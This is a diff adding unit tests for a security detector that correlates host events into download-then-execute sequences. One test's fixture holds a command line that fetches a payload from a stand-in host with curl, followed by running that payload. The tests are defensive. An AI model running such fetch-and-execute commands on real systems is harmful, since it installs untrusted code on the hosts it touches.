@@ -46,6 +46,39 @@ def definition(identifier="SEQ-1", *, order="ordered", joins=None, threshold=Non
 
 
 class SequenceEvaluationTests(unittest.TestCase):
+    def test_structured_process_fields_derive_execution_without_shell_keywords(self):
+        from romulus.intelligence.sequence_analytics import evaluate_sequences
+
+        rule = definition(joins=["asset"])
+        evidence = [
+            {
+                "evidence_id": "E-DOWNLOAD", "observed_at": "2026-10-15T12:00:00Z",
+                "source": "elasticsearch", "source_family": "host", "asset": "host-1",
+                "raw": {"host": {"name": "host-1"}, "process": {"command_line": "curl http://example.test/payload"}},
+            },
+            {
+                "evidence_id": "E-EXECUTE", "observed_at": "2026-10-15T12:02:00Z",
+                "source": "elasticsearch", "source_family": "host", "asset": "host-1",
+                "raw": {"host": {"name": "host-1"}, "process": {
+                    "executable": "/opt/payload", "command_line": "/opt/payload"
+                }},
+            },
+        ]
+
+        matches, _ = evaluate_sequences(evidence, [rule], None)
+
+        self.assertEqual(matches[0]["evidence_ids"], ["E-DOWNLOAD", "E-EXECUTE"])
+
+    def test_one_record_cannot_satisfy_multiple_sequence_stages(self):
+        from romulus.intelligence.sequence_analytics import evaluate_sequences
+
+        row = event("E-ONE", 0, "download")
+        row["signals"].append("execute")
+
+        matches, _ = evaluate_sequences([row], [definition()], None)
+
+        self.assertEqual(matches, [])
+
     def test_ordered_sequence_requires_time_order_same_asset_and_same_actor(self):
         from romulus.intelligence.sequence_analytics import evaluate_sequences
 
